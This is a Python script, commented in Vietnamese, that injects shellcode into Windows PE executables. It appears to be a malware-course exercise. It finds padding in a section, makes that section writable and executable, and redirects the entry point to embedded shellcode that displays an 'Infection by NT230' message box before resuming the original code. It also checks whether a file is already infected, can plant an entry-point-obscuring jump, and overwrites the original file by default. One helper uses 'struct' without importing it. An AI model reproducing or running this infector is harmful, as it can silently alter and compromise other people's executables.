import argparse
import sys
import pefile

class PEInjector:
    def __init__(self, target_file):
        self.target_file = target_file
        self.output_file = target_file
        self.pe = None
        self.shellcode = b""  # Shellcode sẽ được định nghĩa sau
        
    def load_pe_file(self):
        """Tải và phân tích file PE"""
        try:
            self.pe = pefile.PE(self.target_file)
            print(f"[+] Đã tải file: {self.target_file}")
            return True
        except Exception as e:
            print(f"[-] Lỗi khi tải file PE: {e}")
            return False
    
    def find_empty_space(self, shellcode_size):
        """
        Tìm vùng trống đủ lớn để chèn shellcode
        Trả về (virtual_address, raw_offset)
        """
        print(f"[+] Đang tìm vùng trống {shellcode_size} bytes...")
        
        file_data = open(self.target_file, "rb")
        image_base = self.pe.OPTIONAL_HEADER.ImageBase
        consecutive_nops = 0
        
        for section in self.pe.sections:
            if section.SizeOfRawData == 0:
                continue
                
            print(f"    [+] Quét section: {section.Name.decode().rstrip('\\x00')}")
            
            position = 0
            empty_count = 0
            
            # Đọc toàn bộ dữ liệu section
            file_data.seek(section.PointerToRawData, 0)
            section_data = file_data.read(section.SizeOfRawData)
            
            for byte in section_data:
                position += 1
                
                # Kiểm tra chuỗi NOPs 
                if byte == 0x90:
                    consecutive_nops += 1
                else:
                    consecutive_nops = 0
                
                # Kiểm tra xem file đã bị nhiễm chưa
                if consecutive_nops >= 4:
                    file_data.close()
                    raise Exception("File đã bị nhiễm mã độc trước đó!")
                
                # Đếm byte trống liên tiếp
                if byte == 0x00:
                    empty_count += 1
                else:
                    # Tìm thấy khoảng trống đủ lớn
                    if empty_count >= shellcode_size:
                        raw_offset = section.PointerToRawData + position - empty_count - 1
                        virtual_address = image_base + section.VirtualAddress + position - empty_count - 1
                        
                        # Cấp quyền thực thi cho section
                        section.Characteristics = 0xE0000040  # RWE | CODE
                        
                        file_data.close()
                        print(f"    [+] Tìm thấy vùng trống tại: 0x{virtual_address:08X}")
                        return virtual_address, raw_offset
                    
                    empty_count = 0
        
        file_data.close()
        raise Exception("Không tìm thấy vùng trống đủ lớn cho shellcode!")
    
    def prepare_shellcode(self, original_entry_point):
        main_shellcode = self.shellcode
        
        # Tính return address
        return_address = self.pe.OPTIONAL_HEADER.ImageBase + original_entry_point
        
        # Shellcode hoàn chỉnh
        complete_shellcode = b""
        
        # 1. bảo vệ thanh ghi
        complete_shellcode += b"\x60"  # PUSHAD - lưu tất cả thanh ghi
        
        # 2. Main shellcode
        complete_shellcode += main_shellcode
        
        # 3. khôi phục thanh ghi
        complete_shellcode += b"\x61"  # POPAD - khôi phục thanh ghi
        
        # 4. quay lại entry point
        complete_shellcode += b"\x68" + return_address.to_bytes(4, 'little')  # PUSH return_address
        complete_shellcode += b"\xC3"  # RET
        
        print(f"[+] Shellcode hoàn chỉnh: {len(complete_shellcode)} bytes")
        print(f"[+] Return address: 0x{return_address:08X}")
        return complete_shellcode
    
    def inject_shellcode(self, shellcode):
        """Thực hiện chèn shellcode vào file PE"""
        self.shellcode = shellcode
        
        if not self.load_pe_file():
            return False
        
        try:
            # Tìm vùng trống cho shellcode
            new_entry_point, raw_offset = self.find_empty_space(len(shellcode) + 16)
            
            # Lưu Entry Point gốc
            original_entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
            original_entry_virtual = original_entry_point + self.pe.OPTIONAL_HEADER.ImageBase
            
            print(f"[+] Entry Point gốc: 0x{original_entry_virtual:08X}")
            
            # Cập nhật Entry Point mới
            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point - self.pe.OPTIONAL_HEADER.ImageBase
            print(f"[+] Entry Point mới: 0x{new_entry_point:08X}")
            
            # Chuẩn bị shellcode hoàn chỉnh
            complete_shellcode = self.prepare_shellcode(original_entry_point)
            
            # Chèn shellcode vào vùng trống
            self.pe.set_bytes_at_offset(raw_offset, complete_shellcode)
            print(f"[+] Đã chèn shellcode tại offset: 0x{raw_offset:08X}")
            
            # implement EPO
            self._insert_epo_jumps(raw_offset, new_entry_point)
            
            # Ghi file mới
            self.pe.write(self.output_file)
            print(f"[+] Đã ghi file thành công: {self.output_file}")
            
            return True
            
        except Exception as e:
            print(f"[-] Lỗi trong quá trình inject: {e}")
            return False
        finally:
            if self.pe:
                self.pe.close()

    def _insert_epo_jumps(self, shellcode_raw_offset, shellcode_virtual_address):
        """Chèn các lệnh jump EPO một cách thông minh (TUỲ CHỌN)"""
        try:
            # Chỉ chèn jump trong section .text và tại các vị trí an toàn
            for section in self.pe.sections:
                if b'.text' in section.Name and section.Characteristics & 0x20000000:  # EXECUTE
                    # Tìm các vị trí có chuỗi bytes 0x90 (NOP) hoặc 0x00 để chèn jump
                    file_data = open(self.target_file, "rb")
                    file_data.seek(section.PointerToRawData, 0)
                    section_data = file_data.read(section.SizeOfRawData)
                    
                    # Tìm các đoạn NOP sled hoặc padding để chèn jump
                    nop_positions = []
                    for i in range(len(section_data) - 5):
                        if section_data[i:i+5] == b'\x90\x90\x90\x90\x90':  # 5 NOPs liên tiếp
                            nop_positions.append(section.PointerToRawData + i)
                    
                    file_data.close()
                    
                    # Chèn jump tại vị trí an toàn 
                    if nop_positions:
                        safe_offset = nop_positions[0]
                        # Tính relative jump đến shellcode
                        jump_distance = shellcode_raw_offset - safe_offset - 5
                        jump_instruction = b"\xE9" + struct.pack("<i", jump_distance)
                        
                        self.pe.set_bytes_at_offset(safe_offset, jump_instruction)
                        print(f"[+] Đã chèn EPO jump tại offset an toàn: 0x{safe_offset:08X}")
                        break
                        
        except Exception as e:
            print(f"[-] Không thể chèn EPO jump: {e}")

def main():
    """Hàm chính"""
    parser = argparse.ArgumentParser(
        description="PE File Shellcode Injector - Chèn shellcode vào file thực thi Windows",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        '--file', 
        dest='file',
        required=True,
        help='Đường dẫn đến file PE cần inject'
    )
    
    parser.add_argument(
        '--output',
        dest='output',
        help='Đường dẫn file output (mặc định: ghi đè file gốc)'
    )
    
    args = parser.parse_args()

    # Shell code cần chèn
    shellcode = bytes(
        b""
        b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
        b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
        b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
        b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
        b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
        b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
        b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
        b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
        b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
        b"\x61\xc3\xb2\x04\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
        b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\x68\x6c"
        b"\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72"
        b"\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89"
        b"\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x70"
        b"\xff\xff\xff\x68\x33\x30\x20\x20\x68\x20\x4e\x54\x32"
        b"\x68\x6e\x20\x62\x79\x68\x63\x74\x69\x6f\x68\x49\x6e"
        b"\x66\x65\x31\xdb\x88\x5c\x24\x1c\x89\xe3\x68\x36\x31"
        b"\x58\x20\x68\x35\x32\x31\x37\x68\x38\x5f\x32\x33\x68"
        b"\x32\x31\x38\x32\x68\x5f\x32\x33\x35\x68\x31\x33\x30"
        b"\x38\x68\x32\x33\x35\x32\x30\xc9\x88\x4c\x24\x1a\x89"
        b"\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x90"
    )
    
    # Khởi tạo injector
    injector = PEInjector(args.file)
    
    if args.output:
        injector.output_file = args.output
    
    # Thực hiện injection
    success = injector.inject_shellcode(shellcode)
    
    if success:
        print("\n[+] Injection thành công!")
        sys.exit(0)
    else:
        print("\n[-] Injection thất bại!")
        sys.exit(1)

if __name__ == "__main__":
    main()